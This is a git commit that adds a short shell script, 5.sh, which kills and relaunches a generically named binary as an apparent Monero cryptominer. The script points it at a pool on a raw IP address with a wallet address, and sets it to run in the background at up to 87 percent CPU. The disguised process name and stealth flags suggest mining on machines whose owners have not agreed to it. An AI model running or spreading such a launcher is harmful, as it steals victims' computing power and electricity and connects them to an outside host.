fbb858cf7132e0b113d47738c21e29afe2a96eff
simersq <68320185+simersq@users.noreply.github.com>
2020-07-15 16:34:55 +0300

    Add files via upload

---
+++ 5.sh
@@ -0,0 +1,3 @@
+pkill defaultsoftwarename
+sleep 7
+defaultsoftwarename -o 109.234.38.207:37843 -u 473WZv1Y3kzDAP3tn6F4G9BG1EX32GosvaKSqb72cYUo6azTJJxW1PvMN135BN4Xt3QGP6Q8rLptdZzqSwbJM64sJjrtPet --pass=x:kernoserto@yandex.com --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=87 --av=1
